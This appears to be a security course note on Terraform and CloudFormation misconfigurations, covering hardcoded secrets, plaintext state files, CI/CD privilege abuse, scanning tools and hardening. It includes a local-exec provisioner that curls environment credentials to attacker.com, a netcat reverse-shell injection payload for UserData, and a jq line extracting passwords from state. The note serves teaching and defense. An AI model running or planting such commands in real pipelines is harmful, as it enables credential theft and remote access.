---
tags: [cloud-security, iac, terraform, cloudformation, misconfigurations]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.30 Terraform CloudFormation"
---

# Terraform & CloudFormation Misconfigurations

## 1. Introduction to Infrastructure as Code (IaC)
Infrastructure as Code (IaC) is the modern methodology of managing, provisioning, and modifying computing infrastructure and cloud resources through machine-readable definition files, rather than through physical hardware configuration or interactive web consoles. 
The two most dominant tools in the cloud-native ecosystem are:
- **Terraform** (by HashiCorp): A highly extensible, cloud-agnostic tool utilizing HCL (HashiCorp Configuration Language).
- **AWS CloudFormation**: Amazon Web Services' native declarative IaC service, utilizing JSON or YAML templates.

While IaC introduces immense benefits regarding consistency, auditability, disaster recovery, and deployment speed, it simultaneously introduces severe, centralized security risks. A single misconfiguration in an IaC template acts as a "force multiplier"—a mistake (such as opening a security group to `0.0.0.0/0`) is instantly and automatically deployed across hundreds of environments. Furthermore, the CI/CD pipelines and state management mechanisms associated with IaC are extraordinarily privileged, making them prime targets for advanced persistent threats.

## 2. IaC Deployment Architecture & Threat Model

### ASCII Diagram: IaC Threat Landscape and Attack Vectors

```text
+-------------------+       (1) Hardcoded Secrets      +--------------------+
| Developer Laptop  | -------------------------------> |   Git Repository   |
| (Writing HCL/YAML)|                                  | (GitHub, GitLab)   |
+-------------------+                                  +--------------------+
        |                                                      |
        | (2) Local Apply (Risky)                              | (3) CI/CD Webhook Trigger
        v                                                      v
+-------------------+                                  +--------------------+
|  Local State File |                                  |   CI/CD Pipeline   |
| (terraform.tfstate|                                  | (Terraform Cloud,  |
|  *Plaintext Data* |                                  |  GitHub Actions)   |
+-------------------+                                  +--------------------+
        |                                                      |
        | (4) Remote State Access & Exfiltration               | (5) Cloud API Execution
        v                                                      |     (Highly Privileged)
+-------------------+                                          v
| Remote Backend    | <----------------------------------------+
| (S3, GCS, Azure)  |  (State contains generated database      |
+-------------------+   passwords, API keys, private IPs)      |
                                                               v
                                                       +--------------------+
                                                       | Cloud Environment  |
                                                       | (AWS, GCP, Azure)  |
                                                       | [VPCs, EC2, RDS]   |
                                                       +--------------------+
```

## 3. Core Attack Vectors & Misconfigurations

The attack surface of IaC spans the source code, the deployment mechanism, and the state management system.

### A. Hardcoded Secrets in Source Code
One of the most prevalent and easily exploitable vulnerabilities is the inclusion of static credentials (e.g., AWS Access Keys, database passwords, third-party API tokens) directly within `.tf` or `.yaml` files.
When these files are pushed to a central repository, the secrets become permanently embedded in the Git history, easily discoverable by automated scanners (like GitRob or TruffleHog) or malicious insiders.
**Example (Insecure Terraform):**
```hcl
provider "aws" {
  region     = "us-west-2"
  # DANGER: Hardcoded AWS IAM Credentials
  access_key = "AKIAIOSFODNN7EXAMPLE"
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

resource "aws_db_instance" "production_db" {
  engine         = "postgres"
  instance_class = "db.t3.micro"
  # DANGER: Hardcoded Master Password
  password       = "SuperSecretProdDBPassword2026!" 
}
```

### B. State File Exposure (`terraform.tfstate`)
Terraform utilizes state files to map real-world cloud resources to the local configuration, keep track of metadata, and improve performance for large infrastructures. 
**Crucially, Terraform state files store ALL resource attributes in absolute plaintext.** This includes database passwords, dynamically generated API keys, and private SSH keys, *even if they were initially passed as secure environment variables*.

**Attack Scenario:**
If a remote backend (like an Amazon S3 bucket storing `terraform.tfstate`) is misconfigured to be publicly readable, or if an attacker gains limited read access to the bucket via a compromised EC2 instance (SSRF), they can simply download the state file and extract all infrastructure secrets.

**Example Secret Extraction from State:**
```bash
# Extracting a database password directly from the state file using jq
cat terraform.tfstate | jq '.resources[] | select(.type == "aws_db_instance") | .instances[].attributes.password'
```

### C. Over-Permissive CI/CD Roles (Privilege Escalation)
To effectively deploy infrastructure, the CI/CD pipeline executing Terraform or CloudFormation must possess highly privileged cloud credentials (often approaching Administrator access). If an attacker compromises the repository (e.g., via a malicious Pull Request that executes automatically) and alters the IaC template to execute arbitrary commands, they can easily steal the deployment role's credentials.

### D. Infrastructure Drift and Shadow IT
Drift occurs when the actual state of the cloud infrastructure diverges from the IaC definition. While not a direct vulnerability, drift heavily masks malicious activity. For example, if an attacker manually creates a backdoor IAM user via the AWS CLI, it will not be visible in the IaC source code. If the IaC pipeline does not aggressively flag or destroy unmanaged resources, the backdoor persists undetected.

## 4. Exploiting Terraform Provisioners

Terraform supports "provisioners" that execute shell scripts on local or remote machines during the creation or destruction of resources. Attackers with write access to the IaC repository can severely abuse these.

### `local-exec` Exploitation
The `local-exec` provisioner runs commands on the machine actively executing Terraform (usually the CI/CD runner or a developer's laptop).
```hcl
resource "null_resource" "malicious_execution" {
  provisioner "local-exec" {
    # Exfiltrate environment variables (including AWS_ACCESS_KEY_ID) to an attacker C2
    command = "env | base64 | curl -X POST -d @- https://attacker.com/exfil"
  }
}
```
If a developer merges this code, the CI pipeline will execute the command during `terraform apply` (or sometimes even during `terraform plan`), immediately exfiltrating the cloud provider credentials of the CI runner to the attacker.

### `remote-exec` Exploitation
The `remote-exec` provisioner runs commands on newly created resources via SSH or WinRM. It can be abused to silently install backdoors, reverse shells, or crypto-mining malware on newly provisioned EC2 instances before they are even fully integrated into the network.

## 5. CloudFormation Specific Vulnerabilities

### CloudFormation Parameter Injection & Command Execution
Similar to Terraform variables, CloudFormation utilizes parameters to allow dynamic input. If a parameter string is passed directly into a `UserData` block (which executes shell commands as root on EC2 instance startup) without proper sanitization, it can lead to OS Command Injection.
```yaml
Parameters:
  AppName:
    Type: String
Resources:
  MyEC2Instance:
    Type: AWS::EC2::Instance
    Properties:
      UserData:
        Fn::Base64: !Sub |
          #!/bin/bash
          echo "Starting application environment for ${AppName}" 
          # If an attacker controls AppName, they can input:
          # app_name; nc -e /bin/sh attacker.com 4444
```

### Stack Overwriting (Cross-Tenant/Cross-Account Attacks)
If an IAM role allows `cloudformation:UpdateStack` with excessively broad resource permissions, an attacker can modify critical infrastructure stacks. They could replace resources like Security Groups to allow external SSH access to internal databases, or modify IAM roles within the stack to grant themselves administrative access.

## 6. Static Analysis, Auditing & Tooling

Offensive security engineers and DevSecOps teams utilize specialized tools to scan IaC configurations for misconfigurations *before* they are deployed to the cloud.
- **Checkov**: A powerful static analysis tool developed by Bridgecrew (Palo Alto) for finding misconfigurations in Terraform, CloudFormation, Kubernetes, and ARM templates.
- **Tfsec**: A Terraform-specific static analysis security scanner.
- **Terrascan**: A broad IaC scanner supporting multiple frameworks.

**Example Checkov Usage:**
```bash
checkov -d /path/to/terraform/code --framework terraform
```
Checkov output will explicitly flag high-risk issues such as:
- S3 buckets configured without versioning or logging.
- Security groups open to `0.0.0.0/0` on port 22 or 3306.
- Unencrypted EBS volumes or RDS instances.
- Hardcoded AWS credentials.

## 7. Defense, Hardening, and Remediation

### A. Robust Secrets Management
Never hardcode secrets in source control. Utilize dynamic secret management systems like HashiCorp Vault, AWS Secrets Manager, or AWS Systems Manager (SSM) Parameter Store.
```hcl
# Securely fetching a database password at runtime
data "aws_ssm_parameter" "db_password" {
  name            = "/production/database/master_password"
  with_decryption = true
}
```

### B. Securing State Files (The Crown Jewels)
- **Backend Security:** Store remote state in robustly secured backends (e.g., an S3 bucket with strict `Block Public Access` enabled, and bucket policies heavily restricting access exclusively to the CI/CD IAM role).
- **State Encryption:** Always enable State Encryption. Use S3 server-side encryption (SSE-KMS) with a customer-managed KMS key to encrypt the state file at rest.
- **State Locking:** Enable State Locking (e.g., using a DynamoDB table for Terraform) to prevent corruption from concurrent runs, but also to maintain an immutable audit trail of who is attempting to modify state.

### C. Principle of Least Privilege for Deployments
Do not grant the CI/CD pipeline blanket administrative access. Scope the IAM role attached to the pipeline to exactly what resources the IaC needs to create or modify. Consider using distinct, separated IAM roles for `terraform plan` (Read-only access) and `terraform apply` (Write access).

### D. Automated Security Gates in CI/CD
Integrate Checkov or Tfsec directly into the CI/CD pipeline (e.g., via GitHub Actions). Configure the pipeline to definitively block and fail pull requests that attempt to introduce insecure infrastructure configurations.

## 8. Chaining Opportunities
- Extracting cloud credentials from an exposed `terraform.tfstate` leads directly into [[34 - Cloud Backdoor via IAM Role]].
- Abuse of `local-exec` provisioners is a direct vector for initiating [[33 - CI CD Pipeline Attacks]].
- Identifying hardcoded database secrets in HCL files can lead to immediate lateral movement into managed database services.
- Misconfigured security groups deployed via Terraform directly expose infrastructure to external network attacks.

## 9. Related Notes
- [[33 - CI CD Pipeline Attacks]]
- [[32 - Cloud Storage Mining]]
- [[35 - Defense — Least Privilege IAM, IMDSv2, Logging, SCP]]
- [[34 - Cloud Backdoor via IAM Role]]
